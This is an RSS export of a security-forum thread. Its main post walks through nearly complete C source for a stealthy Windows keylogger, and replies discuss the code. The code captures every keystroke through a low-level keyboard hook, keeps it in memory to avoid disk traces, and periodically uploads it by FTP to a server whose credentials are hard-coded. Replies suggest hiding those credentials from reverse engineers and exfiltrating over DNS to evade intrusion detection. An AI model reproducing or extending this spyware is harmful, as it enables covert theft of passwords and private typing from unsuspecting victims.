<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Windows Keylogging - Part II</title>
    <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070</link>
    <description>**Disclaimer**: The synchronisation code is broken since it was written when I had very little knowledge of how it worked.

Following from my previous paper, [Windows Keylogging - Part I](https://0x00sec.org/t/windows-keylogging-part-i/99), I will be showcasing and explaining an example implementation of a Windows keylogger named `Coeus`, after the titan Coeus of Greek mythology, who represents intelligence. Note that this is one possible implementation and is not necessarily the best. To properly understand the paper, it is highly recommended that the reader look over the implementation of a basic keylogger using a keyboard hook (which I have detailed in the previous part) and also its prerequisites which include:
```makefile
Proficiency in C/C++
Knowledge of the WinAPI and its documentation
Knowledge of Windows messages and message queues
Knowledge of Windows hooks
Recommended knowledge of multi-threading
Recommended knowledge of Mutual Exclusions
Recommended knowledge of FTP
```
**Disclaimer**: This paper is not a how-to on making malware, rather it is a report on my research from self-study and experimentation on malware and Windows internals. As a consequence, I apologize in advance for any incorrect information which may be provided. If there is any feedback on this, please leave a reply or private message me and I will address it as soon as possible.

Also any apologies if my code (especially the multithreading) is terrible. Not all hackers are the best programmers.
- - - -
## Keylogging Functionality

Recall that the most basic of keyloggers should record the keystrokes as analyzed in the previous paper. For my implementation, some extra functionality will be included to make it more plausible and effective in doing its job in the outside world. As a natural result, the code will be slightly more advanced than what was already covered. The features of the keylogger are as follows:
```makefile
Threaded keystroke logging using Windows hooks
Threaded keystroke uploads using FTP
Zero disk activity
```
Using Windows hooks to capture keystrokes is a common method utilized by many existing keyloggers. A reason why it may be is because it takes advantage of threading and events which makes it efficient in the aspect of CPU consumption. Another, with regards to malware, many legitimate programs could also implement this function to achieve their own goals.

A vital problem with older generations of malware is that they write the keystrokes to disk and because of this, it generates some noise when doing so which could lead to its undoing. One way to combat this weakness is to directly process all keystrokes within memory and push them out through the network. Of course, this does have its downsides. If the program is always constantly sending the keystrokes out, it will become suspicious however, the rate at which this happens can be controlled to some extent.
- - - -
# Coding the Keylogger

Before we see any of the code in the functions, let me introduce the headers, macros and global variable declarations.
```c
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;Windows.h&gt;
#include &lt;WinInet.h&gt;
#include &lt;ShlObj.h&gt;

#pragma comment(lib, &quot;WININET&quot;)

#define DEBUG

#define NAME &quot;Coeus&quot;

// FTP settings
#define FTP_SERVER &quot;127.0.0.1&quot;
#define FTP_USERNAME &quot;dtm&quot;
#define FTP_PASSWORD &quot;mySup3rSecr3tPassw0rd&quot;
#define FTP_LOG_PATH &quot;Coeus_Log.txt&quot;

#define MAX_LOG_SIZE 4096
#define BUF_SIZ 1024
#define BUF_LEN 1
#define MAX_VALUE_NAME 16383

#define ONE_SECOND 1000
#define ONE_MINUTE ONE_SECOND * 60
#define TIMEOUT ONE_MINUTE * 1 // minutes

// global handle to hook
HHOOK ghHook = NULL;
// global handle to mutex
HANDLE ghMutex = NULL;

// global handle to log heap
HANDLE ghLogHeap = NULL;
// global string pointer to log buffer
LPSTR lpLogBuf = NULL;
// current max size of log buffer
DWORD dwLogBufSize = 0;

// global handle to temporary buffer heap
HANDLE ghTempHeap = NULL;
// global handle to temporary buffer
LPSTR lpTempBuf = NULL;

// multithreading objects
HANDLE hTempBufHasData = NULL;
HANDLE hTempBufNoData = NULL;
```
Global variables aren&#39;t really a _nice_ method of doing things however, for the sake of simplicity of using variables across multiple threads, this was one of the options I chose. Most of these variables are just handles to the two buffers which are used with the multithreading, for example, `lpLogBuf` is the pointer to the buffer which contains the keystrokes and `lpTempBuf` is the pointer to the buffer which contains the data to be uploaded to the FTP server. The two multithreading objects `hTempBufHasData` and `hTempBufNoData` are used to signal whether the temporary buffer (upload buffer) has or has no data to upload, respectively.

So now let&#39;s take a look at the main function.

----------


## `main`

The following is the pseudocode of the `WinMain` function.
```makefile
Main
1. Create mutex to prevent more than one instance
2. Create two buffers, one to hold the keystrokes, one to upload the keystrokes
3. Initialize two events for the two buffers with multithreading
4. Start a thread to upload the keystrokes
5. Create the keyboard hook
6. Enter message loop to process keystrokes
```
Here is the code for the main function. We declare it with `WinMain` for a Windows GUI application which shows no window since there is no actual GUI code nor does it show a console since it is not a console application. In this function, we are needed to set up all the variables and other objects for the program to work, then simply enter an infinite loop to capture keystrokes.
```c
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPCSTR lpCmdLine, int nCmdShow) {
    // mutex to prevent other keylog instances
    ghMutex = CreateMutex(NULL, TRUE, NAME);
    if (ghMutex == NULL) {
        Fatal(&quot;Create mutex&quot;);
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        Fatal(&quot;Mutex already exists&quot;);
        ExitProcess(1);
    }

    // declare handle cleaner on exit
    atexit(CleanUp);

    // allocate heap buffer
    ghLogHeap = HeapCreate(0, BUF_SIZ + 1, 0);
    if (ghLogHeap == NULL) {
        Fatal(&quot;Heap create&quot;);
    }

    lpLogBuf = (LPSTR)HeapAlloc(ghLogHeap, HEAP_ZERO_MEMORY, BUF_SIZ + 1);
    if (lpLogBuf == NULL) {
        Fatal(&quot;Heap alloc&quot;);
    }
    dwLogBufSize = BUF_SIZ + 1;

    ghTempHeap = HeapCreate(0, dwLogBufSize, 0);
    if (ghTempHeap == NULL) {
        Fatal(&quot;Temp heap create&quot;);
    }

    lpTempBuf = (LPSTR)HeapAlloc(ghTempHeap, HEAP_ZERO_MEMORY, dwLogBufSize);
    if (lpTempBuf == NULL) {
        Fatal(&quot;Temp heap alloc&quot;);
    }

    // multithreading set up
    hTempBufHasData = CreateEvent(NULL, TRUE, FALSE, NULL);
    hTempBufNoData = CreateEvent(NULL, TRUE, TRUE, NULL);

    // create thread to send log file to ftp server
    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FTPSend, NULL, 0, NULL) == NULL) {
        Fatal(&quot;Create thread&quot;);
    }

    // set keyboard hooking subroutine
    ghHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (ghHook == NULL) {
        Fatal(&quot;Failed to set keyboard hook&quot;);
    }

    MSG msg;
    while (GetMessage(&amp;msg, 0, 0, 0) != 0) {
        TranslateMessage(&amp;msg);
        DispatchMessage(&amp;msg);    
    }

    UnhookWindowsHookEx(ghHook);

    return 0;
}
```
We require a mutex to prevent duplicate instances being run at the same time. Once we&#39;ve done that, we can initialize the two heaps for our two buffers and the multithreading objects. The `lpTempBuf` buffer obviously starts with no data so we create the `hTempBufNoData` initial state as `TRUE` and the `hTempBufHasData` with `FALSE`. We&#39;ll then create the thread for the FTP uploading routine and then set a hook on keyboard messages. Once we&#39;ve set up everything we require, we place the main function in a message loop to retrieve keystrokes. To capture the keystrokes, we need to set up our `LowLevelKeyboardProc` function accordingly.



----------

## `LowLevelKeyboardProc`

The following is the pseudocode of the `LowLevelKeyboardProc` function.

```makefile
LowLevelKeyboardProc
1. Check if message is a keyboard message
2. Check if key is either pressed or held
3. Parse virtual key code
4. Append the keystroke to the buffer
5. Wait until the upload buffer is empty (already uploaded) if the keystroke buffer is full
6. Else if upload buffer is not ready, skip and end the function
7. If upload buffer is ready, copy keystroke buffer to the upload buffer
8. Signal FTP routine that there is data to upload
9. Zero the keystroke buffer
10. End the function
```
This function is declared as the `CALLBACK` function to process the keystrokes provided by the hook. To record the keystrokes, we need to do some parsing of virtual key codes and some formatting of special keys.
```c
// callback function when key is pressed
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // wParam and lParam have info about keyboard message
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        // if key is pressed or held
        if (wParam == WM_KEYDOWN) {
            // get string length of log buffer
            DWORD dwLogBufLen = strlen(lpLogBuf);

            // copy vkCode into log buffer
            CHAR key[2];
            DWORD vkCode = kbd-&gt;vkCode;
            // key is 0 - 9
            if (vkCode &gt;= 0x30 &amp;&amp; vkCode &lt;= 0x39) {
                // shift key
                if (GetAsyncKeyState(VK_SHIFT)) {
                    switch (vkCode) {
                        case 0x30:
                            Log(&quot;)&quot;);
                            break;
                        case 0x31:
                            Log(&quot;!&quot;);
                            break;
                        case 0x32:
                            Log(&quot;@&quot;);
                            break;
                        case 0x33:
                            Log(&quot;#&quot;);
                            break;
                        case 0x34:
                            Log(&quot;$&quot;);
                            break;
                        case 0x35:
                            Log(&quot;%&quot;);
                            break;
                        case 0x36:
                            Log(&quot;^&quot;);
                            break;
                        case 0x37:
                            Log(&quot;&amp;&quot;);
                            break;
                        case 0x38:
                            Log(&quot;*&quot;);
                            break;
                        case 0x39:
                            Log(&quot;(&quot;);
                            break;
                    }
                    // no shift key
                } else {
                    sprintf(key, &quot;%c&quot;, vkCode);
                    Log(key);
                }
                // key is a - z
            } else if (vkCode &gt;= 0x41 &amp;&amp; vkCode &lt;= 0x5A) {
                // if lowercase
                if (GetAsyncKeyState(VK_SHIFT) ^ ((GetKeyState(VK_CAPITAL) &amp; 0x0001)) == FALSE)
                    vkCode += 32;
                sprintf(key, &quot;%c&quot;, vkCode);
                Log(key);
            // all other keys
            } else {
                switch (vkCode) {
                    case VK_CANCEL:
                        Log(&quot;[CANCEL]&quot;);
                        break;
                    case VK_BACK:
                        Log(&quot;[BACKSPACE]&quot;);
                        break;
                    case VK_TAB:
                        Log(&quot;[TAB]&quot;);
                        break;
                    case VK_CLEAR:
                        Log(&quot;[CLEAR]&quot;);
                        break;
                    case VK_RETURN:
                        Log(&quot;[ENTER]&quot;);
                        break;
                    case VK_CONTROL:
                        Log(&quot;[CTRL]&quot;);
                        break;
                    case VK_MENU:
                        Log(&quot;[ALT]&quot;);
                        break;
                    case VK_PAUSE:
                        Log(&quot;[PAUSE]&quot;);
                        break;
                    case VK_CAPITAL:
                        Log(&quot;[CAPS LOCK]&quot;);
                        break;
                    case VK_ESCAPE:
                        Log(&quot;[ESC]&quot;);
                        break;
                    case VK_SPACE:
                        Log(&quot;[SPACE]&quot;);
                        break;
                    case VK_PRIOR:
                        Log(&quot;[PAGE UP]&quot;);
                        break;
                    case VK_NEXT:
                        Log(&quot;[PAGE DOWN]&quot;);
                        break;
                    case VK_END:
                        Log(&quot;[END]&quot;);
                        break;
                    case VK_HOME:
                        Log(&quot;[HOME]&quot;);
                        break;
                    case VK_LEFT:
                        Log(&quot;[LEFT ARROW]&quot;);
                        break;
                    case VK_UP:
                        Log(&quot;[UP ARROW]&quot;);
                        break;
                    case VK_RIGHT:
                        Log(&quot;[RIGHT ARROW]&quot;);
                        break;
                    case VK_DOWN:
                        Log(&quot;[DOWN ARROW]&quot;);
                        break;
                    case VK_INSERT:
                        Log(&quot;[INS]&quot;);
                        break;
                    case VK_DELETE:
                        Log(&quot;[DEL]&quot;);
                        break;
                    case VK_NUMPAD0:
                        Log(&quot;[NUMPAD 0]&quot;);
                        break;
                    case VK_NUMPAD1:
                        Log(&quot;[NUMPAD 1]&quot;);
                        break;
                    case VK_NUMPAD2:
                        Log(&quot;[NUMPAD 2]&quot;);
                        break;
                    case VK_NUMPAD3:
                        Log(&quot;[NUMPAD 3&quot;);
                        break;
                    case VK_NUMPAD4:
                        Log(&quot;[NUMPAD 4]&quot;);
                        break;
                    case VK_NUMPAD5:
                        Log(&quot;[NUMPAD 5]&quot;);
                        break;
                    case VK_NUMPAD6:
                        Log(&quot;[NUMPAD 6]&quot;);
                        break;
                    case VK_NUMPAD7:
                        Log(&quot;[NUMPAD 7]&quot;);
                        break;
                    case VK_NUMPAD8:
                        Log(&quot;[NUMPAD 8]&quot;);
                        break;
                    case VK_NUMPAD9:
                        Log(&quot;[NUMPAD 9]&quot;);
                        break;
                    case VK_MULTIPLY:
                        Log(&quot;[*]&quot;);
                        break;
                    case VK_ADD:
                        Log(&quot;[+]&quot;);
                        break;
                    case VK_SUBTRACT:
                        Log(&quot;[-]&quot;);
                        break;
                    case VK_DECIMAL:
                        Log(&quot;[.]&quot;);
                        break;
                    case VK_DIVIDE:
                        Log(&quot;[/]&quot;);
                        break;
                    case VK_F1:
                        Log(&quot;[F1]&quot;);
                        break;
                    case VK_F2:
                        Log(&quot;[F2]&quot;);
                        break;
                    case VK_F3:
                        Log(&quot;[F3]&quot;);
                        break;
                    case VK_F4:
                        Log(&quot;[F4]&quot;);
                        break;
                    case VK_F5:
                        Log(&quot;[F5]&quot;);
                        break;
                    case VK_F6:
                        Log(&quot;[F6]&quot;);
                        break;
                    case VK_F7:
                        Log(&quot;[F7]&quot;);
                        break;
                    case VK_F8:
                        Log(&quot;[F8]&quot;);
                        break;
                    case VK_F9:
                        Log(&quot;[F9]&quot;);
                        break;
                    case VK_F10:
                        Log(&quot;[F10]&quot;);
                        break;
                    case VK_F11:
                        Log(&quot;[F11]&quot;);
                        break;
                    case VK_F12:
                        Log(&quot;[F12]&quot;);
                        break;
                    case VK_NUMLOCK:
                        Log(&quot;[NUM LOCK]&quot;);
                        break;
                    case VK_SCROLL:
                        Log(&quot;[SCROLL LOCK]&quot;);
                        break;
                    case VK_OEM_PLUS:
                        GetAsyncKeyState(VK_SHIFT) ? Log(&quot;+&quot;) : Log(&quot;=&quot;);
                        break;
                    case VK_OEM_COMMA:
                        GetAsyncKeyState(VK_SHIFT) ? Log(&quot;&lt;&quot;) : Log(&quot;,&quot;);
                        break;
                    case VK_OEM_MINUS:
                        GetAsyncKeyState(VK_SHIFT) ? Log(&quot;_&quot;) : Log(&quot;-&quot;);
                        break;
                    case VK_OEM_PERIOD:
                        GetAsyncKeyState(VK_SHIFT) ? Log(&quot;&gt;&quot;) : Log(&quot;.&quot;);
                        break;
                    case VK_OEM_1:
                        GetAsyncKeyState(VK_SHIFT) ? Log(&quot;:&quot;) : Log(&quot;;&quot;);
                        break;
                    case VK_OEM_2:
                        GetAsyncKeyState(VK_SHIFT) ? Log(&quot;?&quot;) : Log(&quot;/&quot;);
                        break;
                    case VK_OEM_3:
                        GetAsyncKeyState(VK_SHIFT) ? Log(&quot;~&quot;) : Log(&quot;`&quot;);
                        break;
                    case VK_OEM_4:
                        GetAsyncKeyState(VK_SHIFT) ? Log(&quot;{&quot;) : Log(&quot;[&quot;);
                        break;
                    case VK_OEM_5:
                        GetAsyncKeyState(VK_SHIFT) ? Log(&quot;|&quot;) : Log(&quot;\\&quot;);
                        break;
                    case VK_OEM_6:
                        GetAsyncKeyState(VK_SHIFT) ? Log(&quot;}&quot;) : Log(&quot;]&quot;);
                        break;
                    case VK_OEM_7:
                        GetAsyncKeyState(VK_SHIFT) ? Log(&quot;\&quot;&quot;) : Log(&quot;&#39;&quot;);
                        break;
                }
            }

            // wait until upload buffer is ready
            // if log buffer is at max size, wait until upload is ready
            if (dwLogBufLen == MAX_LOG_SIZE - 1)
                WaitForSingleObject(hTempBufNoData, INFINITE);
            else
                // otherwise, wait for 500 ms 
                if (WaitForSingleObject(hTempBufNoData, 0) == WAIT_TIMEOUT)
                    // ignore if timed out
                    return CallNextHookEx(0, nCode, wParam, lParam);

            // write out to separate buffer
            strcpy(lpTempBuf, lpLogBuf);
            // reset event 
            ResetEvent(hTempBufNoData);
            // signal ftp upload
            SetEvent(hTempBufHasData);

            // reset log buffer size
            ZeroMemory(lpLogBuf, dwLogBufSize);
        }
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}
```
This function is quite lengthy, purely because of the need to properly parse and format the recorded keystroke. There is a lot of hard coding involved to check the given virtual key code provided by the `lParam` parameter. In summary, switch cases are used to provide the corresponding character with a virtual key code which must be checked against the `SHIFT` key to see if any alternate keystrokes were used. For special keys such as `Enter` and `Caps Lock`, formatting is needed so that a label is recorded in place of the actual character. Of course, this is just my implementation of the formatting and by all means, it is entirely possible to have the raw character instead of a representative label.

After all of that has been processed, the keystrokes in the keystroke buffer must be moved into the temporary buffer for uploading. The keystroke buffer needs to be checked first before it can move on to new keystroke input. To make sure that it is always available, an infinite wait state is entered until the temporary buffer is available. When the wait state is unlocked, it will move the data in the keystroke buffer to the temporary buffer and signal for uploading, then zero out the memory for space for new keystrokes. Otherwise, it will enter a wait state which will immediately time out if the temporary buffer is not yet available and continue on.


----------
## `FTPSend`

The following is the pseudocode for the `FTPSend` function.

```makefile
FTPSend
1. Sleep for a specified timeout period
2. Signal that the upload buffer has no data to upload
3. Wait until data has been placed into the upload buffer and is signaled
4. Initialize an FTP internet connection
5. Send an FTP append command to append the data in the upload buffer
6. Write the data to the remote file
7. Close connection and repeat indefinitely
```
A method to prevent disk activity on the target machine is to directly transfer the data over the web. The following code snippet shows how this can be done.
```c
VOID FTPSend(VOID) {
    while (TRUE) {
        // wait until upload buffer has new data
        Sleep(TIMEOUT);
        SetEvent(hTempBufNoData);
        WaitForSingleObject(hTempBufHasData, INFINITE);

        HINTERNET hINet = InternetOpen(NAME, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_PASSIVE);
        if (hINet == NULL)
            continue;

        HINTERNET hFTP = InternetConnect(hINet, FTP_SERVER, INTERNET_DEFAULT_FTP_PORT, FTP_USERNAME, FTP_PASSWORD, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, NULL);
        if (hFTP == NULL) {
            InternetCloseHandle(hINet);
            continue;
        }

        HINTERNET hFTPFile;
        CHAR szTemp[256];
        // FTP append command
        sprintf(szTemp, &quot;APPE %s&quot;, FTP_LOG_PATH);
        BOOL bSuccess = FtpCommand(hFTP, TRUE, FTP_TRANSFER_TYPE_ASCII, szTemp, 0, &amp;hFTPFile);
        if (bSuccess == FALSE) {
            InternetCloseHandle(hFTP);
            InternetCloseHandle(hINet);
            continue;
        }

        DWORD dwWritten = 0;
        bSuccess = InternetWriteFile(hFTPFile, lpTempBuf, strlen(lpTempBuf), &amp;dwWritten);
        if (bSuccess == FALSE) {
            InternetCloseHandle(hFTP);
            InternetCloseHandle(hINet);
            continue;
        }

        InternetCloseHandle(hFTPFile);
        InternetCloseHandle(hFTP);
        InternetCloseHandle(hINet);
        ResetEvent(hTempBufHasData);
        //SetEvent(hTempBufNoData);
    }

    ExitThread(0);
}
```
There&#39;s probably a more efficient way to do this but this is how I did it. I didn&#39;t want to keep the handle to the FTP server because that would probably mean that the process would maintain an connection with the remote server which is not as stealthy. Inside this infinite loop, it `Sleep`s a specified timeout value `TIMEOUT` before doing anything else to try to limit the rate of connections. It will then signal that its temporary buffer has no data to upload and then enter an infinite wait state until the data in the keystroke buffer has transferred its content over. After this has been achieved, it will open an FTP internet connection and then authenticate with the server using the defined credentials. To write the keystrokes to the server, it will issue an `APPE` (append) command to the specified file location and begin writing. Once this is done, it will proceed to close the connection and repeat.

While writing this, I&#39;ve realized that I should probably signal the no data object first before `Sleep`ing. I&#39;ll keep it like so for now since I don&#39;t want to accidentally break the code.

## Conclusion

That&#39;s pretty much it for the showcasing of my code. If there are any errors or concerns, please don&#39;t hesitate to contact me and I will try to handle it ASAP. Thanks for reading and hope you&#39;ve learned something from this.

## Appendix

Other functions not mentioned:
```c
// error message handler function
VOID Fatal(LPCSTR s) {
#ifdef DEBUG
    CHAR err_buf[BUF_SIZ];

    sprintf(err_buf, &quot;%s failed: %lu&quot;, s, GetLastError());
    MessageBox(NULL, err_buf, NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif

    ExitProcess(1);
}

// clean up function on exit
VOID CleanUp(VOID) {
    if (lpLogBuf &amp;&amp; ghLogHeap) {
        HeapFree(ghLogHeap, 0, lpLogBuf);
        HeapDestroy(ghLogHeap);
    }
    if (ghHook) UnhookWindowsHookEx(ghHook);
    if (ghMutex) CloseHandle(ghMutex);
    if (lpTempBuf &amp;&amp; ghTempHeap) {
        HeapFree(ghTempHeap, 0, lpTempBuf);
        HeapDestroy(ghTempHeap);
    }
}
```</description>
    
    <lastBuildDate>Fri, 16 Sep 2016 12:32:24 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/18</link>
        <pubDate>Sun, 21 Jan 2018 00:42:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-18</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>Actually, most of this code was developed by me. I did however, reference some of the virtual key code mappings and concatenation from <a href="http://codereview.stackexchange.com/questions/46980/windows-keylogger-in-c">Code Review on Stack Exchange</a>.</p>
<p>As for the credentials, yes it is a problem. One way to “solve” this issue is by encrypting the strings so that it makes it harder for the reverse engineering to find them but let’s face it, it’s not that hard to break just before the FTP write function call and then pulling the decrypted data off the stack. The emailing method is a possible solution as well but I wasn’t bothered coding that in C.</p>
<p>I’m actually doing a collaborated project right now (if you didn’t see from above comments). I will private message you and the others about the details.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/17</link>
        <pubDate>Fri, 16 Sep 2016 12:32:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-17</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[123loaded]]></dc:creator>
        <description><![CDATA[
            <p>Awesome Awesome Awesome tutorial man. Your first keylogging tutorial gave anybody looking All the means they needed to get the job done and was very well informed as well. You could have just written this and held onto it but instead decided to share it and explain it, though the code is pretty self explanatory imho… but good code should be haha.</p>
<p>If you don’t mind my asking, how much of this did you actually write on your own? Nearly Zero % is a fine answer here, since from the tutorial and your explanation it’s obvious you understand it, and that’s all that really matters when coding really. As Eric Raymond said in the popular computer science book <em>The Cathedral and the Bazaar</em>, “Good programmers know what to write. <strong>Great</strong> ones know what to <strong>rewrite &amp; reuse</strong>”… sometimes also said “good programmers write good code; great programmers steal great code” hahaha.</p>
<p>Anyways, I’m loving these tutorials. Keep em coming. And I wouldn’t mind getting in touch with you and developing some fun projects. I think this (or any virus/exfiltration over the wire really) would be really fun/interesting to try to tunnel the data out via DNS, as DNS is <strong>never</strong> blocked by IPS/IDS and is hardly ever scrutinized/monitored either. I may look into doing that using this code and extend this series haha… Though obviously this could be extended to all Sorts of ideas, but in general my first thought was to do whatever’s necessary to remove the FTP credentials from the binary itself, as to not be reversed by someone at a later date. Keep 'em comin man! Thx!</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/16</link>
        <pubDate>Fri, 16 Sep 2016 10:57:07 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-16</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[Valentine]]></dc:creator>
        <description><![CDATA[
            <p>Thank you very much for the help.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/15</link>
        <pubDate>Thu, 15 Sep 2016 11:36:35 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-15</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>Well I don’t know the specifics of the procedures but you can start by doing something about some of the issues I’ve mentioned above.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/14</link>
        <pubDate>Thu, 15 Sep 2016 01:26:55 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-14</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[Valentine]]></dc:creator>
        <description><![CDATA[
            <p>I guess mine that I want to improve.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/13</link>
        <pubDate>Wed, 14 Sep 2016 11:23:32 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-13</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p><code>nullptr</code> is more or less just a <code>typedef</code>. You could use <code>NULL</code> every single time in C++, if you wanted to do so. <code>nullptr</code> was introduced simply to make intentions appear more clear.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/12</link>
        <pubDate>Tue, 13 Sep 2016 21:46:48 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-12</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[Fust3rCluck]]></dc:creator>
        <description><![CDATA[
            <p>Thanks and I got nullptr and NULL mixed up actually.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/11</link>
        <pubDate>Tue, 13 Sep 2016 21:10:23 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-11</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/fust3rcluck">@Fust3rCluck</a>: <code>nullptr</code> is a C++ thing. I believe that <a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a> is using C.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/10</link>
        <pubDate>Tue, 13 Sep 2016 20:39:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-10</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[Fust3rCluck]]></dc:creator>
        <description><![CDATA[
            <p>Awesome, as someone who is learning C/C++ I can say I’m happy that i understand at least a little bit of that code. <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"> I could use nullptr instead of NULL correct?</p>
<p>EDIT: I got NULL and nullptr mixed up lol.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/9</link>
        <pubDate>Tue, 13 Sep 2016 19:39:42 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-9</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>Yes, there are many different ways of creating keyloggers however, some methods are better than others in certain aspects. For example, it is much easier using your method but it involves a lot of dependency with other files and because of this, it <em>might</em> cause some issues if you end up failing to access certain files or if some of the files fail to work unexpectedly and it’s much more of a hassle to deal with multiple files rather than one. Also, having or creating many files (especially your file containing the keystrokes) tend to leave lot of forensic evidence and footprints.</p>
<p>With regards to your question, which code are you wanting to improve? Mine or yours?</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/8</link>
        <pubDate>Tue, 13 Sep 2016 13:43:02 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-8</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[Valentine]]></dc:creator>
        <description><![CDATA[
